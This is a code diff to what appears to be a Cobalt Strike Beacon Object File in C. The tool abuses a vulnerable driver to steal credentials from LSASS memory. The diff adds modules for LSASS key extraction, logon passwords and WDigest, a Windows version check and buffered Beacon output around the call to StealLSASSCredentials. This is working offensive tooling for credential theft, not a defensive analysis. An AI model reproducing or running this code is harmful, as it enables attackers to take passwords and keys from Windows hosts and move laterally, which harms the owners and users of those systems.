@@ -9,7 +9,11 @@
 #include "superfetch.c"
 #include "lsass.c"
 #include "eprocess.c"
+#include "lsass_getkeys.c"
+#include "lsass_logonpasswords.c"
+#include "lsass_wdigest.c"
 
+formatp outputbuffer;
 
 int go(char *args, int argLen)
 {
@@ -29,14 +33,18 @@ int go(char *args, int argLen)
         return FALSE;
     }
 
+    // We can create buffer now that the initial checks have passed
+    BeaconFormatAlloc(&outputbuffer, 4096);
 
     BOOL bResult = EnablePrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE);
     if (!bResult) 
     {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to enable privilege! Error code: %llx", GetLastError());
+        BeaconFormatPrintf(&outputbuffer, "Failed to enable privilege! Error code: %llx\n", GetLastError());
+        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
+        BeaconFormatFree(&outputbuffer);
         return FALSE;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Enabled SE_PROF_SINGLE_PROCESS_PRIVILEGE");
+    BeaconFormatPrintf(&outputbuffer, "[+] Enabled SE_PROF_SINGLE_PROCESS_PRIVILEGE\n");
 
 
     isServiceInstalled();
@@ -45,26 +53,40 @@ int go(char *args, int argLen)
     HANDLE hFile = CreateFileW(TPWSAV_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) 
     {
-        BeaconPrintf(CALLBACK_ERROR, "Could not open handle to driver : %llx", GetLastError());
+        BeaconFormatPrintf(&outputbuffer, "Could not open handle to driver : %llx\n", GetLastError());
+        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
+        BeaconFormatFree(&outputbuffer);
         return FALSE;
     }
     else 
     {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Got handle to device : %ls", TPWSAV_DEVICE_NAME);
+        BeaconFormatPrintf(&outputbuffer, "[+] Got handle to device : %ls\n", TPWSAV_DEVICE_NAME);
+    }
+
+    char* WindowsVersion = GetWinVersion();
+    BeaconFormatPrintf(&outputbuffer, "[+] Windows Version: %s\n", WindowsVersion);
+
+    char* WindowsBuild = GetWinBuildNumber();
+    BeaconFormatPrintf(&outputbuffer, "[+] Windows Build Number: %s\n", WindowsBuild);
+
+
+    if (!CreateGlobalSuperfetchDatabase())
+    {
+        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
+        BeaconFormatFree(&outputbuffer);
+        return FALSE;
     }
 
 
-    char* WindowsBuild = GetWinBuildNumber();
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Windows Build Number: %s", WindowsBuild);
+    StealLSASSCredentials(hFile, WindowsVersion);
 
+    
+    // Stop and delete service
 
-    CreateGlobalSuperfetchDatabase();
-
-
-    StealLSASSCredentials(hFile, WindowsBuild);
-
-
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Closing handle to vulnerable driver");
+    BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
     CloseHandle(hFile);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
+    BeaconFormatFree(&outputbuffer);
     
 }
